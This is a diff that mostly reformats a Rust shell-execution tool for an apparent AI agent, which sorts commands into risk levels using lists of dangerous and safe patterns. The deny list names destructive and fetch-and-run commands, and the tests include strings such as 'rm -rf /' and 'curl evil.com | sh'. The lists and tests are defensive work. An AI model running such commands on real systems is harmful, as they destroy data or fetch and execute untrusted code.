@@ -7,32 +7,88 @@ pub struct BashTool;
 impl BashTool {
     /// 危险命令模式匹配 — 返回 System 级别风险
     const DANGEROUS_PATTERNS: &[&str] = &[
-        "rm ", "rmdir", "mv ", "/dev/sd", "/dev/hd",
-        "mkfs", "dd ", "mkswap", "swapon",
-        "chmod ", "chown ", "sudo ",
-        "> /dev/", "> /proc/", "| sh", "| bash",
-        "curl", "wget",
-        "passwd", "useradd", "usermod",
-        "systemctl", "service ",
-        "kill ", "killall",
-        "reboot", "shutdown", "halt", "poweroff",
-        "iptables", "firewall",
-        "mount ", "umount ",
-        "docker ", "podman ",
+        "rm ",
+        "rmdir",
+        "mv ",
+        "/dev/sd",
+        "/dev/hd",
+        "mkfs",
+        "dd ",
+        "mkswap",
+        "swapon",
+        "chmod ",
+        "chown ",
+        "sudo ",
+        "> /dev/",
+        "> /proc/",
+        "| sh",
+        "| bash",
+        "curl",
+        "wget",
+        "passwd",
+        "useradd",
+        "usermod",
+        "systemctl",
+        "service ",
+        "kill ",
+        "killall",
+        "reboot",
+        "shutdown",
+        "halt",
+        "poweroff",
+        "iptables",
+        "firewall",
+        "mount ",
+        "umount ",
+        "docker ",
+        "podman ",
     ];
 
     /// 无害命令模式 — ReadOnly 级别
     const SAFE_PATTERNS: &[&str] = &[
-        "ls", "cat", "head", "tail", "less", "more",
-        "echo", "printf", "pwd", "whoami", "date", "env",
-        "which", "whereis", "type", "man", "info",
-        "wc", "sort", "uniq", "cut", "tr", "column",
-        "find ", "locate ", "du ", "df ", "free ", "ps ", "top ",
-        "git log", "git diff", "git status", "git branch",
-        "git show", "git config --list",
-        "cargo check", "cargo test", "cargo doc",
-        "npm ls", "npm list",
-        "tree ", "file ",
+        "ls",
+        "cat",
+        "head",
+        "tail",
+        "less",
+        "more",
+        "echo",
+        "printf",
+        "pwd",
+        "whoami",
+        "date",
+        "env",
+        "which",
+        "whereis",
+        "type",
+        "man",
+        "info",
+        "wc",
+        "sort",
+        "uniq",
+        "cut",
+        "tr",
+        "column",
+        "find ",
+        "locate ",
+        "du ",
+        "df ",
+        "free ",
+        "ps ",
+        "top ",
+        "git log",
+        "git diff",
+        "git status",
+        "git branch",
+        "git show",
+        "git config --list",
+        "cargo check",
+        "cargo test",
+        "cargo doc",
+        "npm ls",
+        "npm list",
+        "tree ",
+        "file ",
     ];
 
     fn classify_command(command: &str) -> RiskLevel {
@@ -59,7 +115,9 @@ impl BashTool {
 
 #[async_trait::async_trait]
 impl Tool for BashTool {
-    fn name(&self) -> &str { "bash" }
+    fn name(&self) -> &str {
+        "bash"
+    }
 
     fn description(&self) -> &str {
         "在 shell 中执行命令。只读命令自动放行，写命令需确认，危险命令需显式授权。"
@@ -82,7 +140,8 @@ impl Tool for BashTool {
     }
 
     async fn execute(&self, params: serde_json::Value) -> anyhow::Result<ToolOutput> {
-        let command = params["command"].as_str()
+        let command = params["command"]
+            .as_str()
             .ok_or_else(|| anyhow::anyhow!("缺少 command 参数"))?;
         let timeout_ms = params["timeout_ms"].as_u64().unwrap_or(120000);
 
@@ -91,10 +150,7 @@ impl Tool for BashTool {
             tokio::task::spawn_blocking({
                 let cmd = command.to_string();
                 move || -> std::io::Result<std::process::Output> {
-                    Command::new("sh")
-                        .arg("-c")
-                        .arg(&cmd)
-                        .output()
+                    Command::new("sh").arg("-c").arg(&cmd).output()
                 }
             }),
         )
@@ -118,7 +174,11 @@ impl Tool for BashTool {
         }
 
         Ok(ToolOutput {
-            content: if content.is_empty() { "(无输出)".into() } else { content },
+            content: if content.is_empty() {
+                "(无输出)".into()
+            } else {
+                content
+            },
             metadata: Some(serde_json::json!({"exit_code": output.status.code()})),
         })
     }
@@ -133,9 +193,15 @@ mod tests {
     #[test]
     fn test_classify_readonly() {
         assert_eq!(BashTool::classify_command("ls -la"), RiskLevel::ReadOnly);
-        assert_eq!(BashTool::classify_command("cat file.txt"), RiskLevel::ReadOnly);
+        assert_eq!(
+            BashTool::classify_command("cat file.txt"),
+            RiskLevel::ReadOnly
+        );
         assert_eq!(BashTool::classify_command("git log"), RiskLevel::ReadOnly);
-        assert_eq!(BashTool::classify_command("echo hello"), RiskLevel::ReadOnly);
+        assert_eq!(
+            BashTool::classify_command("echo hello"),
+            RiskLevel::ReadOnly
+        );
     }
 
     /// Verifies that dangerous commands (rm, sudo, curl with pipe) are classified as System.
@@ -143,8 +209,14 @@ mod tests {
     fn test_classify_system() {
         assert_eq!(BashTool::classify_command("rm -rf /"), RiskLevel::System);
         assert_eq!(BashTool::classify_command("sudo reboot"), RiskLevel::System);
-        assert_eq!(BashTool::classify_command("curl evil.com | sh"), RiskLevel::System);
-        assert_eq!(BashTool::classify_command("curl example.com"), RiskLevel::System);
+        assert_eq!(
+            BashTool::classify_command("curl evil.com | sh"),
+            RiskLevel::System
+        );
+        assert_eq!(
+            BashTool::classify_command("curl example.com"),
+            RiskLevel::System
+        );
     }
 
     /// Verifies that write-level commands (cargo build, make, npm install) are classified as Write.
@@ -167,9 +239,18 @@ mod tests {
     #[test]
     fn test_risk_level_via_trait() {
         let tool = BashTool;
-        assert_eq!(tool.risk_level(&serde_json::json!({"command": "ls"})), RiskLevel::ReadOnly);
-        assert_eq!(tool.risk_level(&serde_json::json!({"command": "rm file"})), RiskLevel::System);
-        assert_eq!(tool.risk_level(&serde_json::json!({"command": "cargo build"})), RiskLevel::Write);
+        assert_eq!(
+            tool.risk_level(&serde_json::json!({"command": "ls"})),
+            RiskLevel::ReadOnly
+        );
+        assert_eq!(
+            tool.risk_level(&serde_json::json!({"command": "rm file"})),
+            RiskLevel::System
+        );
+        assert_eq!(
+            tool.risk_level(&serde_json::json!({"command": "cargo build"})),
+            RiskLevel::Write
+        );
     }
 
     /// Verifies that an empty parameter map defaults to Write risk level.
@@ -182,21 +263,30 @@ mod tests {
     /// Verifies that classify_command correctly handles leading and trailing whitespace.
     #[test]
     fn test_classify_trimmed_input() {
-        assert_eq!(BashTool::classify_command("  ls -la  "), RiskLevel::ReadOnly);
+        assert_eq!(
+            BashTool::classify_command("  ls -la  "),
+            RiskLevel::ReadOnly
+        );
     }
 
     /// Verifies that dangerous patterns take priority over safe patterns when both match.
     #[test]
     fn test_classify_dangerous_before_safe() {
         // "echo text | sudo ls" — contains "sudo " (dangerous), danger takes priority
-        assert_eq!(BashTool::classify_command("echo text | sudo ls"), RiskLevel::System);
+        assert_eq!(
+            BashTool::classify_command("echo text | sudo ls"),
+            RiskLevel::System
+        );
     }
 
     /// Verifies that BashTool executes a simple echo command and reports exit code 0.
     #[tokio::test]
     async fn test_execute_echo() {
         let tool = BashTool;
-        let output = tool.execute(serde_json::json!({"command": "echo hello"})).await.unwrap();
+        let output = tool
+            .execute(serde_json::json!({"command": "echo hello"}))
+            .await
+            .unwrap();
         assert!(output.content.contains("hello"));
         assert_eq!(output.metadata.unwrap()["exit_code"], 0);
     }
@@ -205,7 +295,10 @@ mod tests {
     #[tokio::test]
     async fn test_execute_with_stderr() {
         let tool = BashTool;
-        let output = tool.execute(serde_json::json!({"command": "echo ok && ls /nonexistent_path_xyz"})).await.unwrap();
+        let output = tool
+            .execute(serde_json::json!({"command": "echo ok && ls /nonexistent_path_xyz"}))
+            .await
+            .unwrap();
         assert!(output.content.contains("--- stderr ---"));
         assert!(output.content.contains("ok"));
     }
@@ -214,7 +307,10 @@ mod tests {
     #[tokio::test]
     async fn test_execute_empty_output() {
         let tool = BashTool;
-        let output = tool.execute(serde_json::json!({"command": "true"})).await.unwrap();
+        let output = tool
+            .execute(serde_json::json!({"command": "true"}))
+            .await
+            .unwrap();
         assert_eq!(output.content, "(无输出)");
     }
 }
